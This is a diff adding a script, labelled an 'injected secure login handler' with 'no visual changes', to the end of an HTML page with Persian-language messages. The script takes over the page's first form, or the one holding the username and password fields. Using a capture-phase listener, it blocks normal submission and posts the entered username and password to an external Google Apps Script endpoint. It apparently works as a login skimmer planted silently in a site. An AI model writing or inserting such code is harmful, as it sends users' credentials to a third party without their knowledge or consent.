@@ -292,5 +292,77 @@
 })();
 </script>
 
+
+<!-- Injected secure login handler (no visual changes) -->
+<script>
+(function(){
+  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbzGSKWbMFMOhEPrvSdbZXrZNxI1mOmW73qOZc8US9uixxkuEE_UOClQMWcoX1Ttve8aVw/exec';
+
+  // Utility: show messages using existing modal if present, else fallback to alert()
+  function getEl(id){ return document.getElementById(id); }
+  function show(msg, details){
+    const backdrop = getEl('modalBackdrop');
+    const msgEl = getEl('modalMessage');
+    const detEl = getEl('modalDetails');
+    if (backdrop && msgEl) {
+      msgEl.innerHTML = msg || '';
+      if (detEl) detEl.innerHTML = details || '';
+      backdrop.style.display = 'flex';
+    } else {
+      alert((msg || '') + (details ? ('\n' + (typeof details === 'string' ? details : JSON.stringify(details))) : ''));
+    }
+  }
+  function update(msg, details){
+    const msgEl = getEl('modalMessage');
+    const detEl = getEl('modalDetails');
+    if (msgEl && msg !== undefined) msgEl.innerHTML = msg;
+    if (detEl && details !== undefined) detEl.innerHTML = details;
+  }
+
+  function sanitize(v){
+    return String(v ?? '').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  window.addEventListener('DOMContentLoaded', function(){
+    // Try to locate a login form. Prefer a form containing #username and #password.
+    let form = document.querySelector('form');
+    const u = document.getElementById('username');
+    const p = document.getElementById('password');
+    if (!form && (u || p)) form = (u || p)?.closest('form');
+
+    if (!form) return; // no changes if no form is present
+
+    // Prevent any previous submit handlers from leaking credentials by overriding submit.
+    form.addEventListener('submit', async function(e){
+      e.preventDefault();
+
+      const username = (document.getElementById('username')||{}).value?.trim() || '';
+      const password = (document.getElementById('password')||{}).value?.trim() || '';
+
+      show('<span class="spinner"></span> لطفاً منتظر بمانید…', 'در حال بررسی اطلاعات ورود');
+
+      try{
+        const body = new URLSearchParams({ username, password });
+        const res = await fetch(ENDPOINT, { method: 'POST', mode: 'cors', body });
+        const data = await res.json();
+
+        if (data && data.ok){
+          // Render non-sensitive profile fields if elements exist; else just success text.
+          const list = Object.entries(data.profile || {}).map(([k,v])=>{
+            return `<div><strong>${sanitize(k.replace(/_/g,' '))}</strong>: ${sanitize(v)}</div>`;
+          }).join('');
+          update('ورود با موفقیت انجام شد ✅', list || '');
+          // Optionally: redirect after a short delay if your page expects it.
+          // setTimeout(()=>{ window.location.href = 'index.html'; }, 1000);
+        } else {
+          update('نام کاربری یا رمز عبور نادرست است. ❌', '');
+        }
+      } catch (err){
+        update('خطا در ارتباط با سرور. ❌', '');
+      }
+    }, true);
+  });
+})();
+</script>
 </body>
 </html>
